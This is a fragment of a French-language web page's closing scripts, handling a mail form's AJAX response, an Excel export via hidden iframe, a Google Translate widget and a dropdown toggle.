                      dataType: 'json',
                      contentType: false,
                      success: function(data){
                          // Si la requête est réussie, afficher un message de succès et réinitialiser le formulaire
                          $('#inscrit-table').DataTable().ajax.reload(null, false);
                          $('.addmail').modal('hide');
                          toastr.success(data.msg);
                          $loadingIndicator.hide();
                          submitButton.disabled = false;
                          submitButton.textContent = 'ENVOYEZ MAIL';
                          submitButton.style.cursor = 'pointer';
                      },
                      error: function(xhr, status, error) {

                          $loadingIndicator.hide();
                          toastr.error('Une erreur est survenue. Veuillez réessayer.');
                          submitButton.disabled = false;
                          submitButton.textContent = 'ENVOYEZ MAIL';
                          submitButton.style.cursor = 'pointer';

                      }
                  });
              });

      });

  </script>
  <script>
        $(document).ready(function() {
            $('.select2').select2()
            
            $('#exportButton').on('click', function(event) {
                event.preventDefault();
                var url = $(this).attr('href');

                // Create an iframe and trigger the download
                var iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = url;
                document.body.appendChild(iframe);

                // Show the success message
                toastr.success('Le fichier Excel a été téléchargé avec succès!');
            });
        });
  </script>
  <!-- Script pour Google Translate -->
  <script>
      function matraduction() {
          new google.translate.TranslateElement({ pageLanguage: 'fr' }, 'google_translate_element');
      }
  </script>
  <!-- Charger le script Google Translate -->
  <script src="//translate.google.com/translate_a/element.js?cb=matraduction"></script>
  <script>
      document.getElementById('traduction_button').addEventListener('click', function() {
          var menu = document.getElementById('dropdown_menu');
          if (menu.style.display === 'none' || menu.style.display === '') {
              menu.style.display = 'block';
          } else {
              menu.style.display = 'none';
          }
      });
  </script>
</body>
</html>
